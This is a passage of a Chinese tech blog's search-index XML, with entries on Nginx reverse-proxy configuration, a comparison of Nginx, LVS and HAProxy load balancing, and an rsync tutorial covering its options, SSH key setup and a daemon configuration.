http://wiki.nginx.org/HttpUpstreamRequestHashModule http://www.web-polygraph.org/ http://nginx.org/]]></content>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nginx的代理]]></title>
    <url>%2F2017%2F08%2F12%2FNginx%2F34.%20Nginx%E7%9A%84%E4%BB%A3%E7%90%86%2F</url>
    <content type="text"><![CDATA[Nginx的代理12345678910111213141516171819202122232425262728293031323334353637upstream bbs.aaa.cn&#123; server 1.2.3.1:80; server 1.2.3.4:80; &#125; server &#123; listen 80; server_name bbs.aaa.cn; location / &#123; proxy_pass http://bbs.aaa.cn/; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125;# access_log /home/logs/bbs.access combined; &#125; upstream blog.aaa.cn&#123; server 1.2.3.1:80; server 1.2.3.4:80; &#125; server &#123; listen 80; server_name blog.aaa.cn; location / &#123; proxy_pass http://blog.aaa.cn/; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125;# access_log /home/logs/ss.access combined; &#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;经测试发现，可以用nginx代理一个服务器上所有域名，方法如下： 主配置文件不需要更改任何配置 在vhosts目录下需要建立两个文件，一个是servername 列表文件，一个是虚拟主机配置文件 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;两个文件内容分别为 servername 1server_name www.123.net.cn www.alsdjfl.com www.asdfa1.com; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;就这么简单一行，当然这个server_name 还可以继续添加的 虚拟主机配置文件 1234567891011server &#123; listen 80; include vhosts/servername; # 这里的文件就是上边那个servername列表文件 location / &#123; proxy_pass http://1.2.1.2/; #这里就是需要做代理的服务器ip地址了 proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125; access_log /dev/null; &#125;]]></content>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nginx、LVS及HAProxy负载均衡软件的优缺点详解]]></title>
    <url>%2F2017%2F08%2F12%2FNginx%2F33.%20Nginx%E3%80%81LVS%E5%8F%8AHAProxy%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%BD%AF%E4%BB%B6%E7%9A%84%E4%BC%98%E7%BC%BA%E7%82%B9%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[Nginx、LVS及HAProxy负载均衡软件的优缺点详解&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Nginx/LVS/HAProxy是目前使用最广泛的三种负载均衡软件，本人都在多个项目中实施过，参考了一些资料，结合自己的一些使用经验，总结一下。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一般对负载均衡的使用是随着网站规模的提升根据不同的阶段来使用不同的技术。具体的应用需求还得具体分析，如果是中小型的Web应用，比如日PV小于1000万，用Nginx就完全可以了；如果机器不少，可以用DNS轮询，LVS所耗费的机器还是比较多的；大型网站或重要的服务，且服务器比较多时，可以考虑用LVS。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一种是通过硬件来进行，常见的硬件有比较昂贵的F5和Array等商用的负载均衡器，它的优点就是有专业的维护团队来对这些服务进行维护、缺点就是花销太大，所以对于规模较小的网络服务来说暂时还没有需要使用；另外一种就是类似于Nginx/LVS/HAProxy的基于 Linux的开源免费的负载均衡软件，这些都是通过软件级别来实现，所以费用非常低廉。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;目前关于网站架构一般比较合理流行的架构方案：Web前端采用Nginx/HAProxy+ Keepalived作负载均衡器；后端采用 MySQL数据库一主多从和读写分离，采用LVS+Keepalived的架构。当然要根据项目具体需求制定方案。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面说说各自的特点和适用场合。 NginxNginx的优点是： 工作在网络的7层之上，可以针对http应用做一些分流的策略，比如针对域名、目录结构，它的正则规则比HAProxy更为强大和灵活，这也是它目前广泛流行的主要原因之一，Nginx单凭这点可利用的场合就远多于LVS了。 Nginx对网络稳定性的依赖非常小，理论上能ping通就就能进行负载功能，这个也是它的优势之一；相反LVS对网络稳定性依赖比较大，这点本人深有体会； Nginx安装和配置比较简单，测试起来比较方便，它基本能把错误用日志打印出来。LVS的配置、测试就要花比较长的时间了，LVS对网络依赖比较大。 可以承担高负载压力且稳定，在硬件不差的情况下一般能支撑几万次的并发量，负载度比LVS相对小些。 Nginx可以通过端口检测到服务器内部的故障，比如根据服务器处理网页返回的状态码、超时等等，并且会把返回错误的请求重新提交到另一个节点，不过其中缺点就是不支持url来检测。比如用户正在上传一个文件，而处理该上传的节点刚好在上传过程中出现故障，Nginx会把上传切到另一台服务器重新处理，而LVS就直接断掉了，如果是上传一个很大的文件或者很重要的文件的话，用户可能会因此而不满。 Nginx不仅仅是一款优秀的负载均衡器/反向代理软件，它同时也是功能强大的Web应用服务器。LNMP也是近几年非常流行的web架构，在高流量的环境中稳定性也很好。 Nginx现在作为Web反向加速缓存越来越成熟了，速度比传统的Squid服务器更快，可以考虑用其作为反向代理加速器。 Nginx可作为中层反向代理使用，这一层面Nginx基本上无对手，唯一可以对比Nginx的就只有 lighttpd了，不过 lighttpd目前还没有做到Nginx完全的功能，配置也不那么清晰易读，社区资料也远远没Nginx活跃。 Nginx也可作为静态网页和图片服务器，这方面的性能也无对手。还有Nginx社区非常活跃，第三方模块也很多。 Nginx的缺点是： Nginx仅能支持http、https和Email协议，这样就在适用范围上面小些，这个是它的缺点。 对后端服务器的健康检查，只支持通过端口来检测，不支持通过url来检测。不支持Session的直接保持，但能通过ip_hash来解决。 LVS&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;LVS：使用Linux内核集群实现一个高性能、高可用的负载均衡服务器，它具有很好的可伸缩性（Scalability)、可靠性（Reliability)和可管理性（Manageability)。 LVS的优点是： 抗负载能力强、是工作在网络4层之上仅作分发之用，没有流量的产生，这个特点也决定了它在负载均衡软件里的性能最强的，对内存和cpu资源消耗比较低。 配置性比较低，这是一个缺点也是一个优点，因为没有可太多配置的东西，所以并不需要太多接触，大大减少了人为出错的几率。 工作稳定，因为其本身抗负载能力很强，自身有完整的双机热备方案，如LVS+Keepalived，不过我们在项目实施中用得最多的还是LVS/DR+Keepalived。 无流量，LVS只分发请求，而流量并不从它本身出去，这点保证了均衡器IO的性能不会受到大流量的影响。 应用范围比较广，因为LVS工作在4层，所以它几乎可以对所有应用做负载均衡，包括http、数据库、在线聊天室等等。 LVS的缺点是： 软件本身不支持正则表达式处理，不能做动静分离；而现在许多网站在这方面都有较强的需求，这个是Nginx/HAProxy+Keepalived的优势所在。 如果是网站应用比较庞大的话，LVS/DR+Keepalived实施起来就比较复杂了，特别后面有 Windows Server的机器的话，如果实施及配置还有维护过程就比较复杂了，相对而言，Nginx/HAProxy+Keepalived就简单多了。 HAProxyHAProxy的特点是： HAProxy也是支持虚拟主机的。 HAProxy的优点能够补充Nginx的一些缺点，比如支持Session的保持，Cookie的引导；同时支持通过获取指定的url来检测后端服务器的状态。 HAProxy跟LVS类似，本身就只是一款负载均衡软件；单纯从效率上来讲HAProxy会比Nginx有更出色的负载均衡速度，在并发处理上也是优于Nginx的。 HAProxy支持TCP协议的负载均衡转发，可以对MySQL读进行负载均衡，对后端的MySQL节点进行检测和负载均衡，大家可以用LVS+Keepalived对MySQL主从做负载均衡。 HAProxy负载均衡策略非常多，HAProxy的负载均衡算法现在具体有如下8种： roundrobin，表示简单的轮询，这个不多说，这个是负载均衡基本都具备的； static-rr，表示根据权重，建议关注； leastconn，表示最少连接者先处理，建议关注； source，表示根据请求源IP，这个跟Nginx的IP_hash机制类似，我们用其作为解决session问题的一种方法，建议关注； ri，表示根据请求的URI； rl_param，表示根据请求的URl参数’balance url_param’ requires an URL parameter name； hdr(name)，表示根据HTTP请求头来锁定每一次HTTP请求； rdp-cookie(name)，表示根据据cookie(name)来锁定并哈希每一次TCP请求。 Nginx和LVS对比的总结： Nginx工作在网络的7层，所以它可以针对http应用本身来做分流策略，比如针对域名、目录结构等，相比之下LVS并不具备这样的功能，所以Nginx单凭这点可利用的场合就远多于LVS了；但Nginx有用的这些功能使其可调整度要高于LVS，所以经常要去触碰触碰，触碰多了，人为出问题的几率也就会大。 Nginx对网络稳定性的依赖较小，理论上只要ping得通，网页访问正常，Nginx就能连得通，这是Nginx的一大优势！Nginx同时还能区分内外网，如果是同时拥有内外网的节点，就相当于单机拥有了备份线路；LVS就比较依赖于网络环境，目前来看服务器在同一网段内并且LVS使用direct方式分流，效果较能得到保证。另外注意，LVS需要向托管商至少申请多一个ip来做Visual IP，貌似是不能用本身的IP来做VIP的。要做好LVS管理员，确实得跟进学习很多有关网络通信方面的知识，就不再是一个HTTP那么简单了。 Nginx安装和配置比较简单，测试起来也很方便，因为它基本能把错误用日志打印出来。LVS的安装和配置、测试就要花比较长的时间了；LVS对网络依赖比较大，很多时候不能配置成功都是因为网络问题而不是配置问题，出了问题要解决也相应的会麻烦得多。 Nginx也同样能承受很高负载且稳定，但负载度和稳定度差LVS还有几个等级：Nginx处理所有流量所以受限于机器IO和配置；本身的bug也还是难以避免的。 Nginx可以检测到服务器内部的故障，比如根据服务器处理网页返回的状态码、超时等等，并且会把返回错误的请求重新提交到另一个节点。目前LVS中 ldirectd也能支持针对服务器内部的情况来监控，但LVS的原理使其不能重发请求。比如用户正在上传一个文件，而处理该上传的节点刚好在上传过程中出现故障，Nginx会把上传切到另一台服务器重新处理，而LVS就直接断掉了，如果是上传一个很大的文件或者很重要的文件的话，用户可能会因此而恼火。 Nginx对请求的异步处理可以帮助节点服务器减轻负载，假如使用 apache直接对外服务，那么出现很多的窄带链接时apache服务器将会占用大 量内存而不能释放，使用多一个Nginx做apache代理的话，这些窄带链接会被Nginx挡住，apache上就不会堆积过多的请求，这样就减少了相当多的资源占用。这点使用squid也有相同的作用，即使squid本身配置为不缓存，对apache还是有很大帮助的。 Nginx能支持http、https和email（email的功能比较少用），LVS所支持的应用在这点上会比Nginx更多。在使用上，一般最前端所采取的策略应是LVS，也就是DNS的指向应为LVS均衡器，LVS的优点令它非常适合做这个任务。重要的ip地址，最好交由LVS托管，比如数据库的 ip、webservice服务器的ip等等，这些ip地址随着时间推移，使用面会越来越大，如果更换ip则故障会接踵而至。所以将这些重要ip交给 LVS托管是最为稳妥的，这样做的唯一缺点是需要的VIP数量会比较多。Nginx可作为LVS节点机器使用，一是可以利用Nginx的功能，二是可以利用Nginx的性能。当然这一层面也可以直接使用squid，squid的功能方面就比Nginx弱不少了，性能上也有所逊色于Nginx。Nginx也可作为中层代理使用，这一层面Nginx基本上无对手，唯一可以撼动Nginx的就只有lighttpd了，不过lighttpd目前还没有能做到 Nginx完全的功能，配置也不那么清晰易读。另外，中层代理的IP也是重要的，所以中层代理也拥有一个VIP和LVS是最完美的方案了。具体的应用还得具体分析，如果是比较小的网站（日PV小于1000万），用Nginx就完全可以了，如果机器也不少，可以用DNS轮询，LVS所耗费的机器还是比较多的；大型网站或者重要的服务，机器不发愁的时候，要多多考虑利用LVS。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;现在对网络负载均衡的使用是随着网站规模的提升根据不同的阶段来使用不同的技术： 第一阶段：利用Nginx或HAProxy进行单点的负载均衡，这一阶段服务器规模刚脱离开单服务器、单数据库的模式，需要一定的负载均衡，但是仍然规模较小没有专业的维护团队来进行维护，也没有需要进行大规模的网站部署。这样利用Nginx或HAproxy就是第一选择，此时这些东西上手快， 配置容易，在七层之上利用HTTP协议就可以。这时是第一选择。 第二阶段：随着网络服务进一步扩大，这时单点的Nginx已经不能满足，这时使用LVS或者商用Array就是首要选择，Nginx此时就作为LVS或者Array的节点来使用，具体LVS或Array的是选择是根据公司规模和预算来选择，Array的应用交付功能非常强大，本人在某项目中使用过，性价比也远高于F5，商用首选，但是一般来说这阶段相关人才跟不上业务的提升，所以购买商业负载均衡已经成为了必经之路。 第三阶段：这时网络服务已经成为主流产品，此时随着公司知名度也进一步扩展，相关人才的能力以及数量也随之提升，这时无论从开发适合自身产品的定制，以及降低成本来讲开源的LVS，已经成为首选，这时LVS会成为主流。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;最终形成比较理想的基本架构为：Array/LVS — Nginx/Haproxy — Squid/Varnish — AppServer。]]></content>
      <tags>
        <tag>LVS</tag>
        <tag>haproxy</tag>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- rsync]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F85.%20Linux%20%E5%91%BD%E4%BB%A4-%20rsync%2F</url>
    <content type="text"><![CDATA[Linux 命令- rsync&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;rsync从字面上的意思可以理解为remote sync （远程同步）这样可以理解的更深刻一些。Rsync不仅可以远程同步数据（类似于scp），当然还可以本地同步数据（类似于cp），但不同于cp或scp的一点是，rsync不像cp/scp一样会覆盖以前的数据（如果数据已经存在），它会先判断已经存在的数据和新数据有什么不同，只有不同时才会把不同的部分覆盖掉。如果Linux没有rsync命令使用yum安装 1yum install -y rsync 命令语法123456rsync [OPTION]... SRC DEST rsync [OPTION]... SRC [USER@]host:DEST rsync [OPTION]... [USER@]HOST:SRC DEST rsync [OPTION]... [USER@]HOST::SRC DEST rsync [OPTION]... SRC [USER@]HOST::DEST rsync [OPTION]... rsync://[USER@]HOST[:PORT]/SRC [DEST] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对应以上六种命令格式，rsync有六种不同的工作模式： 拷贝本地文件。当SRC和DES路径信息都不包含有单个冒号 : 分隔符时就启动这种工作模式。 1rsync -a /data/backup 使用一个远程shell程序（如rsh、ssh）来实现将本地机器的内容拷贝到远程机器。当DST路径地址包含单个冒号 : 分隔符时启动该模式。 1rsync -avz *.c foo:src 使用一个远程shell程序（如rsh、ssh）来实现将远程机器的内容拷贝到本地机器。当SRC地址路径包含单个冒号 : 分隔符时启动该模式。 1rsync -avz foo:src/bar /data 从远程rsync服务器中拷贝文件到本地。当SRC路径信息包含“::”分隔符时启动该模式。 1rsync -av root@192.168.78.192::www /databack 从本地机器拷贝文件到远程rsync服务器中。当DST路径信息包含“::”分隔符十启动该模式。 1rsync -av /databack root@192.168.78.192::www 列远程机的文件列表。类似于rsync传输，不过主要在命令中省略掉本机信息即可 1rsync -v rsync://192.168.78.192/www 命令参数 -v, –verbose 详细模式输出。 -q, –quiet 精简输出模式。 -c, –checksum 打开校验开关，强制对文件传输进行校验。 -a, –archive 归档模式，表示以递归方式传输文件，并保持所有文件属性，等于-rlptgoD。 -r, –recursive 对子目录以递归模式处理。 -R, –relative 使用相对路径信息。 -b, –backup 创建备份，也就是对于目的已经存在有同样的文件名时，将老的文件重新命名为~filename。可以使用–suffix选项来指定不同的备份文件前缀。 –backup-dir 将备份文件(如~filename)存放在在目录下。 -suffix=SUFFIX 定义备份文件前缀。 -u, –update 仅仅进行更新，也就是跳过所有已经存在于DST，并且文件时间晚于要备份的文件，不覆盖更新的文件。 -l, –links 保留软链结。 -L, –copy-links 想对待常规文件一样处理软链结。 –copy-unsafe-links 仅仅拷贝指向SRC路径目录树以外的链结。 –safe-links 忽略指向SRC路径目录树以外的链结。 -H, –hard-links 保留硬链结。 -p, –perms 保持文件权限。 -o, –owner 保持文件属主信息。 -g, –group 保持文件属组信息。 -D, –devices 保持设备文件信息。 -t, –times 保持文件时间信息。 -S, –sparse 对稀疏文件进行特殊处理以节省DST的空间。 -n, –dry-run现实哪些文件将被传输。 -w, –whole-file 拷贝文件，不进行增量检测。 -x, –one-file-system 不要跨越文件系统边界。 -B, –block-size=SIZE 检验算法使用的块尺寸，默认是700字节。 -e, –rsh=command 指定使用rsh、ssh方式进行数据同步。 –rsync-path=PATH 指定远程服务器上的rsync命令所在路径信息。 -C, –cvs-exclude 使用和CVS一样的方法自动忽略文件，用来排除那些不希望传输的文件。 –existing 仅仅更新那些已经存在于DST的文件，而不备份那些新创建的文件。 –delete 删除那些DST中SRC没有的文件。 –delete-excluded 同样删除接收端那些被该选项指定排除的文件。 –delete-after 传输结束以后再删除。 –ignore-errors 及时出现IO错误也进行删除。 –max-delete=NUM 最多删除NUM个文件。 - -partial 保留那些因故没有完全传输的文件，以是加快随后的再次传输。 –force 强制删除目录，即使不为空。 –numeric-ids 不将数字的用户和组id匹配为用户名和组名。 –timeout=time ip超时时间，单位为秒。 -I, –ignore-times 不跳过那些有同样的时间和长度的文件。 –size-only 当决定是否要备份文件时，仅仅察看文件大小而不考虑文件时间。 –modify-window=NUM 决定文件是否时间相同时使用的时间戳窗口，默认为0。 -T –temp-dir=DIR 在DIR中创建临时文件。 –compare-dest=DIR 同样比较DIR中的文件来决定是否需要备份。 -P 等同于 –partial。 –progress 显示备份过程。 -z, –compress 对备份的文件在传输时进行压缩处理。 –exclude=PATTERN 指定排除不需要传输的文件模式。 –include=PATTERN 指定不排除而需要传输的文件模式。 –exclude-from=FILE 排除FILE中指定模式的文件。 –include-from=FILE 不排除FILE指定模式匹配的文件。 –version 打印版本信息。 –address 绑定到特定的地址。 –config=FILE 指定其他的配置文件，不使用默认的rsyncd.conf文件。 –port=PORT 指定其他的rsync服务端口。 –blocking-io 对远程shell使用阻塞IO。 -stats 给出某些文件的传输状态。 –progress 在传输时现实传输过程。 –log-format=formAT 指定日志文件格式。 –password-file=FILE 从FILE中得到密码。 –bwlimit=KBPS 限制I/O带宽，KBytes per second。 -h, –help 显示帮助信息。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;常用选项：-a、-v、–delete、–exclude 使用实例&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;试验准备 12345678910111213[root@localhost ~]# mkdir rsync[root@localhost ~]# cd rsync[root@localhost rsync]# mkdir test1[root@localhost rsync]# cd test1[root@localhost test1]# touch 1 2 3[root@localhost test1]# ln -s /root/123.txt ./123.txt[root@localhost test1]# ls -l总用量 0-rw-r--r-- 1 root root 0 6月 10 12:58 1lrwxrwxrwx 1 root root 13 6月 10 12:59 123.txt -&gt; /root/123.txt-rw-r--r-- 1 root root 0 6月 10 12:58 2-rw-r--r-- 1 root root 0 6月 10 12:58 3[root@localhost test1]# cd .. 实例1：使用-a选项12345[root@localhost rsync]# rsync -a test1 test2[root@localhost rsync]# ls test2test1[root@localhost rsync]# ls test2/test1/1 123.txt 2 3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里有一个问题，就是本来想把test1目录直接拷贝成test2目录，可结果rsync却新建了test2目录，然后把test1目录放到了test2目录中。为了避免这样的情况，可以这样做： 12345678[root@localhost rsync]# rm -rf test2[root@localhost rsync]# rsync -a test1/ test2/[root@localhost rsync]# ls -l test2/总用量 0-rw-r--r-- 1 root root 0 6月 10 12:58 1lrwxrwxrwx 1 root root 13 6月 10 12:59 123.txt -&gt; /root/123.txt-rw-r--r-- 1 root root 0 6月 10 12:58 2-rw-r--r-- 1 root root 0 6月 10 12:58 3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加个斜杠就可以了，所以建议在使用rsync备份目录时要养成加斜杠的习惯。-a选项表示以递归方式传输文件，并保持所有属性，等同于-rlptgoD。-a选项后面可以跟一个 --no-OPTION 这个表示关闭 -rlptgoD中的某一个，例如，-a--no-l 等同于 -rptgoD。下面看一看-l选项的作用： 1234567891011[root@localhost rsync]# rsync -av --no-l test1/ test2/sending incremental file listcreated directory test2./1skipping non-regular file "123.txt"23sent 200 bytes received 72 bytes 544.00 bytes/sectotal size is 13 speedup is 0.05 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用-v选项看起来方便，上例跳过了非普通文件123.txt，其实123.txt是一个软连接文件，如果不使用-l选项则不理会软连接文件的。虽然加上-l选项会把软连接文件给拷贝过去，但是软连接的目标文件却没有拷贝过去。 实例2：使用-L选项1234567891011121314151617[root@localhost rsync]# rsync -avL test1/ test2/sending incremental file listcreated directory test2./1123.txt23sent 231 bytes received 91 bytes 644.00 bytes/sectotal size is 0 speedup is 0.00[root@localhost rsync]# ls -l test2/总用量 0-rw-r--r-- 1 root root 0 6月 10 12:58 1-rw-r--r-- 1 root root 0 6月 10 12:39 123.txt-rw-r--r-- 1 root root 0 6月 10 12:58 2-rw-r--r-- 1 root root 0 6月 10 12:58 3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加上-L选项就可以把SRC中软连接的目标文件给拷贝到DST。 实例3：使用-u选项&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先查看一下test1/1和test2/1的创建时间（肯定是一样的），然后使用touch修改一下test2/1的创建时间（此时test2/1要比test1/1的创建时间晚了一些），如果不加-u选项的话，会把test2/1的创建时间编程和test1/1的创建时间一样。 123456789[root@localhost rsync]# ll test1/1 test2/1-rw-r--r-- 1 root root 0 6月 10 12:58 test1/1-rw-r--r-- 1 root root 0 6月 10 12:58 test2/1root@localhost rsync]# touch test2/1[root@localhost rsync]# ll test2/1-rw-r--r-- 1 root root 0 6月 10 13:20 test2/1[root@localhost rsync]# rsync -a test1/1 test2/[root@localhost rsync]# ll test2/1-rw-r--r-- 1 root root 0 6月 10 12:58 test2/1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加上-u选项后，不会再把test1/1同步为test2/1了。 1234567891011121314[root@localhost rsync]# touch test2/1[root@localhost rsync]# ll test2/1-rw-r--r-- 1 root root 0 6月 10 13:31 test2/1[root@localhost rsync]# rsync -avu test1/ test2/sending incremental file list./123.txt -&gt; /root/123.txtsent 100 bytes received 18 bytes 236.00 bytes/sectotal size is 13 speedup is 0.11[root@localhost rsync]# ll test2/1-rw-r--r-- 1 root root 0 6月 10 13:31 test2/1[root@localhost rsync]# ll test1/1-rw-r--r-- 1 root root 0 6月 10 12:58 test1/1 实例4：使用 –delete选项&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先删除test1/123.txt 123[root@localhost rsync]# rm -f test1/123.txt[root@localhost rsync]# ls test1/1 2 3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后把test1/目录同步到test2/目录下 123456789[root@localhost rsync]# rsync -av test1/ test2/sending incremental file list./1sent 94 bytes received 34 bytes 256.00 bytes/sectotal size is 0 speedup is 0.00[root@localhost rsync]# ls test2/1 123.txt 2 3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;test2/目录并没有删除掉123.txt，下面加上 --delete 选项： 12345678[root@localhost rsync]# rsync -av --delete test1/ test2/sending incremental file listdeleting 123.txtsent 52 bytes received 12 bytes 128.00 bytes/sectotal size is 0 speedup is 0.00[root@localhost rsync]# ls test2/1 2 3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;test2/目录里的123.txt也被删除了，这就是 --delete 选项的用处。还有一种情况就是如果在DST增加了文件了，而SRC当中没有这些文件，同步时加上 --delete 选项后同样会删除新增的文件： 12345678910[root@localhost rsync]# touch test2/4[root@localhost rsync]# ls test1/1 2 3[root@localhost rsync]# ls test2/1 2 3 4[root@localhost rsync]# rsync -a --delete test1/ test2/[root@localhost rsync]# ls test1/1 2 3[root@localhost rsync]# ls test2/1 2 3 实例5：使用 –exclude选项123456[[root@localhost rsync]# touch test1/4[root@localhost rsync]# rsync -a --exclude="4" test1/ test2/[root@localhost rsync]# ls test1/1 2 3 4[root@localhost rsync]# ls test2/1 2 3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另外还可以使用匹配字符 * 12345678910111213[root@localhost rsync]# touch test1/1.txt test1/2.txt[root@localhost rsync]# ls test1/1 1.txt 2 2.txt 3 4[root@localhost rsync]# rsync -a --progress --exclude="*.txt" test1/ test2/sending incremental file list./40 100% 0.00kB/s 0:00:00 (xfer#1, to-check=0/5)sent 104 bytes received 34 bytes 276.00 bytes/sectotal size is 0 speedup is 0.00[root@localhost rsync]# ls test2/1 2 3 4 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上例中，连带着使用了 --progress 选项，这个主要是用来观察rsync同步过程的状态的。简单总结一下，平时使用rsync同步数据的时候，使用-a选项基本上就可以达到想要的效果了，只是有时候会有个别的需求，会用到 -a --no-OPTION , -u , -L , --delete , --exclude 以及 --progress 这些选项。 实例6：ssh隧道方式1234567891011121314root@localhost rsync]# rsync -avL test1/ www@192.168.0.101:/tmp/test2/www@192.168.0.101's password:sending incremental file listcreated directory /tmp/test2./11.txt22.txt34sent 327 bytes received 129 bytes 182.40 bytes/sectotal size is 0 speedup is 0.00 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这种方式是通过ssh拷贝数据，需要输入192.168.0.101那台机器www账户的密码。 1234567891011121314[root@localhost rsync]# rsync -avL www@192.168.0.101:/tmp/test2/ ./test3/www@192.168.0.101's password:receiving incremental file listcreated directory ./test3./11.txt22.txt34sent 128 bytes received 351 bytes 38.32 bytes/sectotal size is 0 speedup is 0.00 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以上两种凡是如果写到脚背里，备份起来就有麻烦了，因为要输入密码，脚本本来就是自动的，不可能做到。但是不代表没有解决办法。那微是统计过密钥验证，密钥不设立密码就ok了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在操作以前先设置主机信息：192.168.0.10（主机名yanyi-1）和192.168.0.101（主机名yanyi），需要从yanyi-1拷贝数据到yanyi上。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先确认一下yanyi-1上是否有这个文件 /root/.ssh/id_rsa.pub 12[root@yanyi-1 ~]# ssh-keygenGenerating public/private rsa key pair. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果Linux不存在这个文件，按如下方法生成： 123456789[root@yanyi-1 ~]# ssh-keygenGenerating public/private rsa key pair.Enter file in which to save the key (/root/.ssh/id_rsa):Enter passphrase (empty for no passphrase):Enter same passphrase again:Your identification has been saved in /root/.ssh/id_rsa.Your public key has been saved in /root/.ssh/id_rsa.pub.The key fingerprint is:3b:74:af:e8:08:ac:99:30:3f:ef:84:7a:a0:a6:3d:89 root@Aming-1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在这个过程中会有一些交互的过程，它首先提示要输入这个密钥的密码，出于安全考虑应该定义个密码，但是目的就是为了自动化同步数据，所以这里不输入任何密码，直接按回车，即密码为空。最后则生成了私钥 /root/.ssh/id_rsa 和公钥文件 /root/.ssh/id_rsa.pub &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;把公钥文件的内容拷贝到目标机器上： 12root@yanyi-1 ~]# cat .ssh/id_rsa.pubssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA5SPyJ/kliGTAMUan/GCN325VS8jMxvOn4uQoLU/NqBpCI3MrmvSucv6EAzxx1J2uOssW08el06LG+cUwXmm5mkqDRBV6C9qNnR/bVV5vr3QsUwbKPr7fdyJvruQWWR7cSL+mjP0SYmG2Qy2JcM3hl1IZArzC6yeUnq2Gwbax8LgbZE3XfRfOYdimwyh5Tfft7yLYipWc37k+oRUWkI3mW7PalsOlfQhxrLD/lS891y6RdSbGxMJWPoV0KMFbVh+uJgyAXpeuWl+F+/iuQPzb6w3h4pWI31bvbsE9BU82jSzHYEjpq3SN2MJN2vaLs5a0mVpm9zka/h4ITFB8Uy1iSQ== root@yanyi-1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;复制主机yanyi-1的 /root/.ssh/id_rsa.pub 文件内容，并粘贴到主机yanyi的 /home/www/.ssh/authorized_keys 中: 1[root@yanyi ~]# vim /home/www/.ssh/authorized_keys &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这一步也许会遇到/home/www/.ssh目录不存在的问题，可以手动创建，并修改目录权限为700，也可以执行 ssh-krygen 命令生成这个目录。保存/home/www/.ssh/authorized_keys文件后，再到主机yanyi-1上执行： 123[root@yanyi-1 ~]# ssh www@192.168.0.101Last login: Wed Jun 12 12:24:34 2013 from 192.168.0.10[www@yanyi ~]$ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;现在不用输入密码也可以登录主机yanyi了。下面先用yanyi主机退出来，再从主机yanyi-1上执行rsync命令： 12345678910111213[root@yanyi-1 ~]# rsync -av rsync/test1/ www@192.168.0.101:/tmp/test4/sending incremental file listcreated directory /tmp/test4./11.txt22.txt34sent 327 bytes received 129 bytes 912.00 bytes/sectotal size is 0 speedup is 0.00 实例7：后台服务方式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这种方式可以理解成，在远程主机上建立一个rsync的服务器，在服务器上匹配好rsync的各种应用，然后本机作为rsync的一个客户端去连接远程的rsync服务器。 1、建立并配置rsync的配置文件 /etc/rsyncd.conf1234567891011121314151617[root@yanyi-1 ~]# vim /etc/rsyncd.conf#port=873log file=/var/log/rsync.logpid file=/var/run/rsyncd.pid#address=192.168.0.10[test]path=/root/rsyncuse chroot=truemax connections=4read only=nolist=trueuid=rootgid=rootauth users=testsecrets file=/etc/rsyncd.passwdhosts allow=192.168.0.101 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其中配置文件分为两部分：全局置部分和模块配置部分。全局部分就是几个参数而已，就像rsyncd.conf中port、log file、pid file、address这些都属于全局配置。而 [test]以下部分就是模块配置部分了。一个配置文件中可以有多个模块，模块名自定义，格式就像rsyncd.conf中的这样。其实模块中的一些参数例如，use chroot、max connections、uid、gid、auth users、secrets file以及hosts allow都恶意可配置成全局的参数。当然给出的参数并不是所有的，可以通过 man rsyncd.conf 获得更多信息。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面简单解释一下这些参数的意义 